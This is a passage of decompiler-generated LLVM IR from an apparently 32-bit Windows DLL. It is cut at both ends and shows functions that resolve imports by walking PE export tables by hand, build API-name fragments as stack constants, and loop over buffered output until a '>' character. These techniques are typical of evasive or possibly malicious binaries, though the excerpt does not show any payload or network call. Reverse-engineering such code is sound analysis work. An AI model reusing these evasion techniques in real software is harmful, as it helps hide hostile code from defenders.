  store i32 1634956133, i32* %54, align 4, !insn.addr !1410
  %170 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1411
  store i32 5727591, i32* %170, align 4, !insn.addr !1411
  %171 = call i32 @function_10009390(), !insn.addr !1412
  %172 = load i128, i128* @global_var_10039b20, align 4, !insn.addr !1413
  %173 = call i128 @__asm_movaps(i128 %172), !insn.addr !1413
  %174 = inttoptr i32 %81 to i8*, !insn.addr !1414
  store i8 0, i8* %174, align 1, !insn.addr !1414
  %175 = inttoptr i32 %67 to i128*, !insn.addr !1415
  %176 = load i128, i128* %175, align 4, !insn.addr !1415
  call void @__asm_movups(i128 %176, i128 %173), !insn.addr !1415
  %177 = call i32 @function_10009390(), !insn.addr !1416
  %178 = load i128, i128* @global_var_10039a40, align 4, !insn.addr !1417
  %179 = call i128 @__asm_movaps(i128 %178), !insn.addr !1417
  store i8 0, i8* %174, align 1, !insn.addr !1418
  %180 = load i128, i128* %175, align 4, !insn.addr !1419
  call void @__asm_movups(i128 %180, i128 %179), !insn.addr !1419
  %181 = call i32 @function_10009390(), !insn.addr !1420
  %182 = add i32 %esp.0.reload, -120, !insn.addr !1421
  %183 = inttoptr i32 %182 to i32*, !insn.addr !1421
  store i32 0, i32* %183, align 4, !insn.addr !1421
  %184 = add i32 %esp.0.reload, -124, !insn.addr !1422
  %185 = inttoptr i32 %184 to i32*, !insn.addr !1422
  store i32 0, i32* %185, align 4, !insn.addr !1422
  %186 = add i32 %esp.0.reload, -128, !insn.addr !1423
  %187 = inttoptr i32 %186 to i32*, !insn.addr !1423
  store i32 0, i32* %187, align 4, !insn.addr !1423
  %188 = add i32 %esp.0.reload, -132, !insn.addr !1424
  %189 = inttoptr i32 %188 to i32*, !insn.addr !1424
  store i32 %127, i32* %189, align 4, !insn.addr !1424
  %190 = icmp eq i32 %127, 0, !insn.addr !1425
  store i32 %188, i32* %esp.1.reg2mem, !insn.addr !1426
  br i1 %190, label %dec_label_pc_1000337f, label %dec_label_pc_10003360, !insn.addr !1426

dec_label_pc_10003360:                            ; preds = %dec_label_pc_1000317a, %dec_label_pc_10003360
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %191 = add i32 %esp.1.reload, 64, !insn.addr !1427
  %192 = add i32 %esp.1.reload, -4, !insn.addr !1428
  %193 = inttoptr i32 %192 to i32*, !insn.addr !1428
  store i32 %191, i32* %193, align 4, !insn.addr !1428
  %194 = add i32 %esp.1.reload, 60, !insn.addr !1429
  %195 = add i32 %esp.1.reload, -8, !insn.addr !1430
  %196 = inttoptr i32 %195 to i32*, !insn.addr !1430
  store i32 %194, i32* %196, align 4, !insn.addr !1430
  %197 = add i32 %esp.1.reload, -12, !insn.addr !1431
  %198 = inttoptr i32 %197 to i32*, !insn.addr !1431
  store i32 0, i32* %198, align 4, !insn.addr !1431
  %199 = add i32 %esp.1.reload, -16, !insn.addr !1432
  %200 = inttoptr i32 %199 to i32*, !insn.addr !1432
  store i32 0, i32* %200, align 4, !insn.addr !1432
  %201 = add i32 %esp.1.reload, -20, !insn.addr !1433
  %202 = inttoptr i32 %201 to i32*, !insn.addr !1433
  store i32 0, i32* %202, align 4, !insn.addr !1433
  %203 = add i32 %esp.1.reload, 56, !insn.addr !1434
  %204 = add i32 %esp.1.reload, -24, !insn.addr !1435
  %205 = inttoptr i32 %204 to i32*, !insn.addr !1435
  store i32 %203, i32* %205, align 4, !insn.addr !1435
  %206 = icmp eq i32 %203, 0, !insn.addr !1436
  %207 = icmp eq i1 %206, false, !insn.addr !1437
  store i32 %204, i32* %esp.1.reg2mem, !insn.addr !1437
  br i1 %207, label %dec_label_pc_10003360, label %dec_label_pc_1000337f, !insn.addr !1437

dec_label_pc_1000337f:                            ; preds = %dec_label_pc_10003360, %dec_label_pc_1000317a
  %208 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1438
  ret i32 %208, !insn.addr !1439
}

define i32 @function_100033a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100033a0:
  %eax.0.reg2mem = alloca i32, !insn.addr !1440
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-119 = alloca i32, align 4
  %2 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-20 = alloca i32, align 4
  %3 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !1441
  call void @__asm_movq.31(i64 %2, i128 %3), !insn.addr !1442
  store i32 10, i32* %stack_var_-20, align 4, !insn.addr !1443
  %4 = call i32 @function_10001170(i32* nonnull %stack_var_-20), !insn.addr !1444
  %5 = call i32* @_memset(i32* nonnull %stack_var_-119, i32 0, i32 99), !insn.addr !1445
  store i32 1953067607, i32* %stack_var_-120, align 4, !insn.addr !1446
  %6 = call i32 @function_10009e60(i32 %0, i32* nonnull %stack_var_-120), !insn.addr !1447
  br label %dec_label_pc_10003430, !insn.addr !1448

dec_label_pc_10003430:                            ; preds = %dec_label_pc_10003430, %dec_label_pc_100033a0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %7 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !1449
  %8 = load i8, i8* %7, align 1, !insn.addr !1449
  %9 = add i32 %eax.0.reload, 1, !insn.addr !1450
  %10 = icmp eq i8 %8, 0, !insn.addr !1451
  %11 = icmp eq i1 %10, false, !insn.addr !1452
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !1452
  br i1 %11, label %dec_label_pc_10003430, label %dec_label_pc_10003437, !insn.addr !1452

dec_label_pc_10003437:                            ; preds = %dec_label_pc_10003430
  %12 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1453
  ret i32 %12, !insn.addr !1454
}

define i32 @function_10003460(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10003460:
  %esp.0.reg2mem = alloca i32, !insn.addr !1455
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-10532 = alloca i32, align 4
  %stack_var_-10540 = alloca i32, align 4
  %1 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %2 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-219 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %3 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1456
  %4 = call i32 @__chkstk(), !insn.addr !1457
  %5 = call i32* @_memset(i32* nonnull %stack_var_-219, i32 0, i32 99), !insn.addr !1458
  %6 = add i32 %0, 60, !insn.addr !1459
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1459
  %8 = load i32, i32* %7, align 4, !insn.addr !1459
  %9 = add i32 %0, 120
  %10 = add i32 %8, %9, !insn.addr !1460
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1460
  %12 = load i32, i32* %11, align 4, !insn.addr !1460
  %13 = add i32 %12, %0, !insn.addr !1461
  %14 = call i32 @function_10009e60(i32 1634038339, i32* inttoptr (i32 1766876532 to i32*)), !insn.addr !1462
  %15 = add i32 %13, 36, !insn.addr !1463
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1463
  %17 = load i32, i32* %16, align 4, !insn.addr !1463
  %18 = mul i32 %14, 2, !insn.addr !1464
  %19 = add i32 %18, %0, !insn.addr !1464
  %20 = add i32 %19, %17, !insn.addr !1465
  %21 = inttoptr i32 %20 to i16*, !insn.addr !1465
  %22 = load i16, i16* %21, align 2, !insn.addr !1465
  %23 = zext i16 %22 to i32, !insn.addr !1465
  %24 = add i32 %13, 28, !insn.addr !1466
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1466
  %26 = load i32, i32* %25, align 4, !insn.addr !1466
  %27 = mul i32 %23, 4, !insn.addr !1467
  %28 = add i32 %26, %0, !insn.addr !1467
  %29 = add i32 %28, %27, !insn.addr !1468
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1468
  %31 = load i32, i32* %30, align 4, !insn.addr !1468
  %32 = add i32 %31, %0, !insn.addr !1469
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1470
  %34 = call i32* @_memset(i32* %33, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1470
  %35 = load i128, i128* @global_var_10039af0, align 4, !insn.addr !1471
  %36 = call i128 @__asm_movaps(i128 %35), !insn.addr !1471
  call void @__asm_movups(i128 %2, i128 %36), !insn.addr !1472
  %37 = call i32* @_memset(i32* inttoptr (i32 1852795252 to i32*), i32 0, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1473
  %38 = call i32* @_memset(i32* inttoptr (i32 1634038339 to i32*), i32 1917871476, i32 1936024431), !insn.addr !1474
  store i32 1684104530, i32* %stack_var_-324, align 4, !insn.addr !1475
  %39 = call i32 @function_10009390(), !insn.addr !1476
  %40 = call i32 @function_10009e60(i32 12, i32* null), !insn.addr !1477
  %41 = call i128 @__asm_xorps(i128 %36, i128 %36), !insn.addr !1478
  call void @__asm_movups(i128 %1, i128 %41), !insn.addr !1479
  %42 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1480
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1481
  %43 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1481
  %44 = trunc i128 %1 to i32, !insn.addr !1482
  store i32 %44, i32* @global_var_10040030, align 4, !insn.addr !1483
  %45 = ptrtoint i32* %stack_var_-324 to i32, !insn.addr !1484
  %46 = ptrtoint i32* %stack_var_-10540 to i32
  %47 = ptrtoint i32* %stack_var_-10532 to i32
  %48 = sub i32 0, %0
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1483
  br label %dec_label_pc_100036b2, !insn.addr !1483

dec_label_pc_100036b2:                            ; preds = %dec_label_pc_1000371a, %dec_label_pc_10003460
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = load i32, i32* %7, align 4, !insn.addr !1485
  %50 = add i32 %49, %9, !insn.addr !1486
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1486
  %52 = load i32, i32* %51, align 4, !insn.addr !1486
  %53 = add i32 %52, %0, !insn.addr !1487
  %54 = add i32 %esp.0.reload, -4, !insn.addr !1484
  %55 = inttoptr i32 %54 to i32*, !insn.addr !1484
  store i32 %45, i32* %55, align 4, !insn.addr !1484
  %56 = add i32 %esp.0.reload, -8, !insn.addr !1488
  %57 = inttoptr i32 %56 to i32*, !insn.addr !1488
  %58 = call i32 @function_10009e60(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1489
  %59 = add i32 %53, 36, !insn.addr !1490
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1490
  %61 = load i32, i32* %60, align 4, !insn.addr !1490
  %62 = mul i32 %58, 2, !insn.addr !1491
  %63 = add i32 %62, %0, !insn.addr !1491
  %64 = add i32 %63, %61, !insn.addr !1492
  %65 = inttoptr i32 %64 to i16*, !insn.addr !1492
  %66 = load i16, i16* %65, align 2, !insn.addr !1492
  %67 = zext i16 %66 to i32, !insn.addr !1492
  %68 = add i32 %53, 28, !insn.addr !1493
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1493
  %70 = load i32, i32* %69, align 4, !insn.addr !1493
  store i32 0, i32* %55, align 4, !insn.addr !1494
  %71 = mul i32 %67, 4, !insn.addr !1495
  %72 = add i32 %70, %0, !insn.addr !1495
  %73 = add i32 %72, %71, !insn.addr !1496
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1496
  %75 = load i32, i32* %74, align 4, !insn.addr !1496
  store i32 %46, i32* %57, align 4, !insn.addr !1497
  %76 = add i32 %esp.0.reload, -12, !insn.addr !1498
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1498
  store i32 10000, i32* %77, align 4, !insn.addr !1498
  %78 = add i32 %esp.0.reload, -16, !insn.addr !1499
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1499
  store i32 %47, i32* %79, align 4, !insn.addr !1499
  %80 = load i32, i32* @global_var_1003ed00, align 4, !insn.addr !1500
  %81 = add i32 %esp.0.reload, -20, !insn.addr !1500
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1500
  store i32 %80, i32* %82, align 4, !insn.addr !1500
  %83 = icmp eq i32 %75, %48, !insn.addr !1501
  br i1 %83, label %dec_label_pc_10003730, label %dec_label_pc_10003709, !insn.addr !1502

dec_label_pc_10003709:                            ; preds = %dec_label_pc_100036b2
  %84 = load i32, i32* %stack_var_-10540, align 4, !insn.addr !1503
  %85 = icmp eq i32 %84, 0, !insn.addr !1504
  br i1 %85, label %dec_label_pc_10003730, label %dec_label_pc_10003713, !insn.addr !1505

dec_label_pc_10003713:                            ; preds = %dec_label_pc_10003709
  %86 = icmp ult i32 %84, 10000, !insn.addr !1506
  %87 = icmp eq i1 %86, false, !insn.addr !1507
  br i1 %87, label %dec_label_pc_1000374b, label %dec_label_pc_1000371a, !insn.addr !1507

dec_label_pc_1000371a:                            ; preds = %dec_label_pc_10003713
  %88 = add i32 %84, %3
  %89 = add i32 %88, -10528, !insn.addr !1508
  %90 = inttoptr i32 %89 to i8*, !insn.addr !1508
  store i8 0, i8* %90, align 1, !insn.addr !1508
  %91 = add i32 %88, -10529, !insn.addr !1509
  %92 = inttoptr i32 %91 to i8*, !insn.addr !1509
  %93 = load i8, i8* %92, align 1, !insn.addr !1509
  %94 = icmp eq i8 %93, 62, !insn.addr !1509
  store i32 %81, i32* %esp.0.reg2mem, !insn.addr !1510
  br i1 %94, label %dec_label_pc_10003730, label %dec_label_pc_100036b2, !insn.addr !1510

dec_label_pc_10003730:                            ; preds = %dec_label_pc_1000371a, %dec_label_pc_10003709, %dec_label_pc_100036b2
  store i32 1, i32* @global_var_10040028, align 4, !insn.addr !1511
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1512
  ret i32 %95, !insn.addr !1513

dec_label_pc_1000374b:                            ; preds = %dec_label_pc_10003713
  %96 = call i32 @___report_rangecheckfailure(), !insn.addr !1514
  %97 = call i32 @__asm_int3(), !insn.addr !1515
  %98 = call i32 @__asm_int3(), !insn.addr !1516
  %99 = call i32 @__asm_int3(), !insn.addr !1517
  %100 = call i32 @__asm_int3(), !insn.addr !1518
  %101 = call i32 @__asm_int3(), !insn.addr !1519
  %102 = call i32 @__asm_int3(), !insn.addr !1520
  %103 = call i32 @__asm_int3(), !insn.addr !1521
  %104 = call i32 @__asm_int3(), !insn.addr !1522
  %105 = call i32 @__asm_int3(), !insn.addr !1523
  %106 = call i32 @__asm_int3(), !insn.addr !1524
  %107 = call i32 @__asm_int3(), !insn.addr !1525
  %108 = call i32 @__asm_int3(), !insn.addr !1526
  %109 = call i32 @__asm_int3(), !insn.addr !1527
  %110 = call i32 @__asm_int3(), !insn.addr !1528
  %111 = call i32 @__asm_int3(), !insn.addr !1529
  %112 = call i32 @__asm_int3(), !insn.addr !1530
  ret i32 %112, !insn.addr !1530
}

define i32 @function_10003760(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10003760:
  %esi.1.reg2mem = alloca i32, !insn.addr !1531
  %esp.1.reg2mem = alloca i32, !insn.addr !1531
  %esi.0.reg2mem = alloca i32, !insn.addr !1531
  %esp.0.reg2mem = alloca i32, !insn.addr !1531
  %stack_var_-2472 = alloca i32, align 4
  %stack_var_-744 = alloca i32, align 4
  %stack_var_-2424 = alloca i32, align 4
  %stack_var_-2436 = alloca i32, align 4
  %stack_var_-2432 = alloca i32, align 4
  %stack_var_-1055 = alloca i32, align 4
  %stack_var_-847 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_-639 = alloca i32, align 4
  %stack_var_-535 = alloca i32, align 4
  %stack_var_-951 = alloca i32, align 4
  %stack_var_-1423 = alloca i32, align 4
  %0 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-431 = alloca i32, align 4
  %stack_var_-1159 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-2500 = alloca i32, align 4
  %stack_var_-119 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-119 to i32, !insn.addr !1532
  store i32 %1, i32* %stack_var_-2500, align 4, !insn.addr !1532
  %2 = call i32* @_memset(i32* nonnull %stack_var_-119, i32 0, i32 99), !insn.addr !1533
  %3 = add i32 %arg2, 60, !insn.addr !1534
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1534
  %5 = load i32, i32* %4, align 4, !insn.addr !1534
  store i32 1684107084, i32* %stack_var_-224, align 4, !insn.addr !1535
  %6 = add i32 %arg2, 120, !insn.addr !1536
  %7 = add i32 %6, %5, !insn.addr !1536
  %8 = inttoptr i32 %7 to i32*, !insn.addr !1536
  %9 = load i32, i32* %8, align 4, !insn.addr !1536
  %10 = add i32 %9, %arg2, !insn.addr !1537
  %11 = call i32 @function_10009e60(i32 %arg2, i32* nonnull %stack_var_-224), !insn.addr !1538
  %12 = add i32 %10, 36, !insn.addr !1539
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1539
  %14 = load i32, i32* %13, align 4, !insn.addr !1539
  %15 = mul i32 %11, 2, !insn.addr !1540
  %16 = add i32 %15, %arg2, !insn.addr !1540
  %17 = add i32 %16, %14, !insn.addr !1541
  %18 = inttoptr i32 %17 to i16*, !insn.addr !1541
  %19 = load i16, i16* %18, align 2, !insn.addr !1541
  %20 = zext i16 %19 to i32, !insn.addr !1541
  %21 = add i32 %10, 28, !insn.addr !1542
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1542
  %23 = load i32, i32* %22, align 4, !insn.addr !1542
  %24 = mul i32 %20, 4, !insn.addr !1543
  %25 = add i32 %23, %arg2, !insn.addr !1543
  %26 = add i32 %25, %24, !insn.addr !1544
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1544
  %28 = load i32, i32* %27, align 4, !insn.addr !1544
  %29 = add i32 %28, %arg2, !insn.addr !1545
  store i32 %29, i32* @global_var_1003ed04, align 4, !insn.addr !1546
  store i32 1416914247, i32* %stack_var_-328, align 4, !insn.addr !1547
  %30 = call i32 @function_10009e60(i32 %29, i32* nonnull %stack_var_-328), !insn.addr !1548
  %31 = call i32* @_memset(i32* nonnull %stack_var_-1159, i32 0, i32 99), !insn.addr !1549
  %32 = load i128, i128* @global_var_10039b00, align 4, !insn.addr !1550
  %33 = call i128 @__asm_movaps(i128 %32), !insn.addr !1550
  call void @__asm_movups(i128 %0, i128 %33), !insn.addr !1551
  %34 = call i32* @_memset(i32* nonnull %stack_var_-431, i32 0, i32 99), !insn.addr !1552
  %35 = call i32 @function_10009390(), !insn.addr !1553
  %36 = call i32* @_memset(i32* nonnull %stack_var_-1423, i32 0, i32 259), !insn.addr !1554
  %37 = call i32 @function_10009390(), !insn.addr !1555
  %38 = call i32* @_memset(i32* nonnull %stack_var_-951, i32 0, i32 99), !insn.addr !1556
  %39 = call i32 @function_10009390(), !insn.addr !1557
  %40 = call i32* @_memset(i32* nonnull %stack_var_-535, i32 0, i32 99), !insn.addr !1558
  %41 = call i32 @function_10009390(), !insn.addr !1559
  %42 = call i32* @_memset(i32* nonnull %stack_var_-639, i32 0, i32 99), !insn.addr !1560
  store i32 1701602628, i32* %stack_var_-640, align 4, !insn.addr !1561
  %43 = call i32* @_memset(i32* nonnull %stack_var_-847, i32 0, i32 99), !insn.addr !1562
  %44 = call i32 @function_10009390(), !insn.addr !1563
  %45 = call i32* @_memset(i32* nonnull %stack_var_-1055, i32 0, i32 99), !insn.addr !1564
  %46 = call i32 @function_10009390(), !insn.addr !1565
  store i32 64, i32* %stack_var_-2500, align 4, !insn.addr !1566
  %47 = load i32, i32* @global_var_10040028, align 4, !insn.addr !1567
  %48 = icmp eq i32 %47, 0, !insn.addr !1567
  %49 = icmp eq i1 %48, false, !insn.addr !1568
  br i1 %49, label %dec_label_pc_10003a92, label %dec_label_pc_10003a8b, !insn.addr !1568

dec_label_pc_10003a8b:                            ; preds = %dec_label_pc_10003760
  %50 = call i32 @function_10003460(i32 64, i32 100000), !insn.addr !1569
  br label %dec_label_pc_10003a92, !insn.addr !1569

dec_label_pc_10003a92:                            ; preds = %dec_label_pc_10003a8b, %dec_label_pc_10003760
  %51 = ptrtoint i32* %stack_var_-2500 to i32, !insn.addr !1566
  %52 = call i32 @function_10009390(), !insn.addr !1570
  %53 = call i32 @function_100033a0(i32 %52), !insn.addr !1571
  store i32 0, i32* %stack_var_-2432, align 4, !insn.addr !1572
  %54 = ptrtoint i32* %stack_var_-2436 to i32
  %55 = ptrtoint i32* %stack_var_-2432 to i32
  %56 = add i32 %46, -1
  store i32 %51, i32* %esp.0.reg2mem, !insn.addr !1573
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !1573
  br label %dec_label_pc_10003ad0, !insn.addr !1573

dec_label_pc_10003ad0:                            ; preds = %dec_label_pc_10003b17, %dec_label_pc_10003a92
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %57 = add i32 %esp.0.reload, -4, !insn.addr !1574
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1574
  store i32 %54, i32* %58, align 4, !insn.addr !1574
  %59 = load i32, i32* @global_var_10040030, align 4, !insn.addr !1575
  %60 = add i32 %esp.0.reload, -8, !insn.addr !1575
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1575
  store i32 %59, i32* %61, align 4, !insn.addr !1575
  %62 = load i32, i32* %stack_var_-2436, align 4, !insn.addr !1576
  %63 = icmp eq i32 %62, 259, !insn.addr !1576
  %64 = icmp eq i1 %63, false, !insn.addr !1577
  store i32 %60, i32* %esp.1.reg2mem, !insn.addr !1577
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !1577
  br i1 %64, label %dec_label_pc_10003b24, label %dec_label_pc_10003aeb, !insn.addr !1577

dec_label_pc_10003aeb:                            ; preds = %dec_label_pc_10003ad0
  %65 = add i32 %esp.0.reload, -12, !insn.addr !1578
  %66 = inttoptr i32 %65 to i32*, !insn.addr !1578
  store i32 0, i32* %66, align 4, !insn.addr !1578
  %67 = add i32 %esp.0.reload, -16, !insn.addr !1579
  %68 = inttoptr i32 %67 to i32*, !insn.addr !1579
  store i32 %55, i32* %68, align 4, !insn.addr !1579
  %69 = add i32 %esp.0.reload, -20, !insn.addr !1580
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1580
  store i32 100000, i32* %70, align 4, !insn.addr !1580
  %71 = add i32 %esi.0.reload, %46, !insn.addr !1581
  %72 = add i32 %esp.0.reload, -24, !insn.addr !1582
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1582
  store i32 %71, i32* %73, align 4, !insn.addr !1582
  %74 = load i32, i32* @global_var_1003ed00, align 4, !insn.addr !1583
  %75 = add i32 %esp.0.reload, -28, !insn.addr !1583
  %76 = inttoptr i32 %75 to i32*, !insn.addr !1583
  store i32 %74, i32* %76, align 4, !insn.addr !1583
  %77 = icmp eq i32 %71, 0, !insn.addr !1584
  store i32 %75, i32* %esp.1.reg2mem, !insn.addr !1585
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !1585
  br i1 %77, label %dec_label_pc_10003b24, label %dec_label_pc_10003b0d, !insn.addr !1585

dec_label_pc_10003b0d:                            ; preds = %dec_label_pc_10003aeb
  %78 = load i32, i32* %stack_var_-2432, align 4, !insn.addr !1586
  %79 = icmp eq i32 %78, 0, !insn.addr !1587
  store i32 %75, i32* %esp.1.reg2mem, !insn.addr !1588
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !1588
  br i1 %79, label %dec_label_pc_10003b24, label %dec_label_pc_10003b17, !insn.addr !1588

dec_label_pc_10003b17:                            ; preds = %dec_label_pc_10003b0d
  %80 = add i32 %78, %esi.0.reload, !insn.addr !1589
  %81 = add i32 %56, %80, !insn.addr !1590
  %82 = inttoptr i32 %81 to i8*, !insn.addr !1590
  %83 = load i8, i8* %82, align 1, !insn.addr !1590
  %84 = icmp eq i8 %83, 62, !insn.addr !1590
  store i32 %75, i32* %esp.0.reg2mem, !insn.addr !1591
  store i32 %80, i32* %esi.0.reg2mem, !insn.addr !1591
  store i32 %75, i32* %esp.1.reg2mem, !insn.addr !1591
  store i32 %80, i32* %esi.1.reg2mem, !insn.addr !1591
  br i1 %84, label %dec_label_pc_10003b24, label %dec_label_pc_10003ad0, !insn.addr !1591

dec_label_pc_10003b24:                            ; preds = %dec_label_pc_10003b17, %dec_label_pc_10003b0d, %dec_label_pc_10003aeb, %dec_label_pc_10003ad0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %85 = add i32 %esp.1.reload, -4, !insn.addr !1592
  %86 = inttoptr i32 %85 to i32*, !insn.addr !1592
  %87 = ptrtoint i32* %stack_var_-640 to i32, !insn.addr !1592
  store i32 %87, i32* %86, align 4, !insn.addr !1592
  %88 = add i32 %esp.1.reload, -8, !insn.addr !1593
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1593
  store i32 %29, i32* %89, align 4, !insn.addr !1593
  %90 = call i32 @function_10009e60(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1594
  %91 = add i32 %esi.1.reload, %46, !insn.addr !1595
  %92 = inttoptr i32 %91 to i8*, !insn.addr !1595
  store i8 0, i8* %92, align 1, !insn.addr !1595
  store i32 %54, i32* %86, align 4, !insn.addr !1596
  %93 = load i32, i32* @global_var_10040030, align 4, !insn.addr !1597
  store i32 %93, i32* %89, align 4, !insn.addr !1597
  %94 = load i32, i32* @global_var_10040028, align 4, !insn.addr !1598
  %95 = icmp eq i32 %esi.1.reload, 259, !insn.addr !1599
  %96 = icmp eq i1 %95, false, !insn.addr !1600
  %97 = select i1 %96, i32 0, i32 %94, !insn.addr !1600
  store i32 %97, i32* @global_var_10040028, align 4, !insn.addr !1601
  %98 = add i32 %esp.1.reload, -12, !insn.addr !1602
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1602
  %100 = ptrtoint i32* %stack_var_-2424 to i32, !insn.addr !1602
  store i32 %100, i32* %99, align 4, !insn.addr !1602
  %101 = add i32 %esp.1.reload, -16, !insn.addr !1603
  %102 = inttoptr i32 %101 to i32*, !insn.addr !1603
  store i32 1000, i32* %102, align 4, !insn.addr !1603
  store i32 1514360132, i32* %stack_var_-744, align 4, !insn.addr !1604
  %103 = add i32 %esp.1.reload, -20, !insn.addr !1605
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1605
  %105 = ptrtoint i32* %stack_var_-744 to i32, !insn.addr !1605
  store i32 %105, i32* %104, align 4, !insn.addr !1605
  %106 = load i32, i32* %stack_var_-744, align 4, !insn.addr !1606
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1606
  %108 = call i32 @function_10001170(i32* %107), !insn.addr !1606
  %109 = add i32 %esp.1.reload, -24, !insn.addr !1607
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1607
  store i32 0, i32* %110, align 4, !insn.addr !1607
  %111 = add i32 %esp.1.reload, -28, !insn.addr !1608
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1608
  store i32 0, i32* %112, align 4, !insn.addr !1608
  %113 = add i32 %esp.1.reload, -32, !insn.addr !1609
  %114 = inttoptr i32 %113 to i32*, !insn.addr !1609
  store i32 2, i32* %114, align 4, !insn.addr !1609
  %115 = add i32 %esp.1.reload, -36, !insn.addr !1610
  %116 = inttoptr i32 %115 to i32*, !insn.addr !1610
  store i32 0, i32* %116, align 4, !insn.addr !1610
  %117 = add i32 %esp.1.reload, -40, !insn.addr !1611
  %118 = inttoptr i32 %117 to i32*, !insn.addr !1611
  store i32 7, i32* %118, align 4, !insn.addr !1611
  %119 = add i32 %esp.1.reload, -44, !insn.addr !1612
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1612
  store i32 1073741824, i32* %120, align 4, !insn.addr !1612
  %121 = add i32 %esp.1.reload, -48, !insn.addr !1613
  %122 = inttoptr i32 %121 to i32*, !insn.addr !1613
  store i32 %100, i32* %122, align 4, !insn.addr !1613
  %123 = add i32 %esp.1.reload, -52, !insn.addr !1614
  %124 = inttoptr i32 %123 to i32*, !insn.addr !1614
  store i32 0, i32* %124, align 4, !insn.addr !1614
  %125 = add i32 %esp.1.reload, -56, !insn.addr !1615
  %126 = inttoptr i32 %125 to i32*, !insn.addr !1615
  %127 = ptrtoint i32* %stack_var_-2472 to i32, !insn.addr !1615
  store i32 %127, i32* %126, align 4, !insn.addr !1615
  %128 = add i32 %esp.1.reload, -60, !insn.addr !1616
  %129 = inttoptr i32 %128 to i32*, !insn.addr !1616
  store i32 %esi.1.reload, i32* %129, align 4, !insn.addr !1616
  %130 = add i32 %esp.1.reload, -64, !insn.addr !1617
  %131 = inttoptr i32 %130 to i32*, !insn.addr !1617
  store i32 %46, i32* %131, align 4, !insn.addr !1617
  %132 = add i32 %esp.1.reload, -68, !insn.addr !1618
  %133 = inttoptr i32 %132 to i32*, !insn.addr !1618
  store i32 %100, i32* %133, align 4, !insn.addr !1618
  %134 = add i32 %esp.1.reload, -72, !insn.addr !1619
  %135 = inttoptr i32 %134 to i32*, !insn.addr !1619
  store i32 %100, i32* %135, align 4, !insn.addr !1619
  %136 = add i32 %esp.1.reload, -76, !insn.addr !1620
  %137 = inttoptr i32 %136 to i32*, !insn.addr !1620
  store i32 %46, i32* %137, align 4, !insn.addr !1620
  %138 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1621
  ret i32 %138, !insn.addr !1622
}

define i32 @function_10003c10() local_unnamed_addr {
dec_label_pc_10003c10:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1623
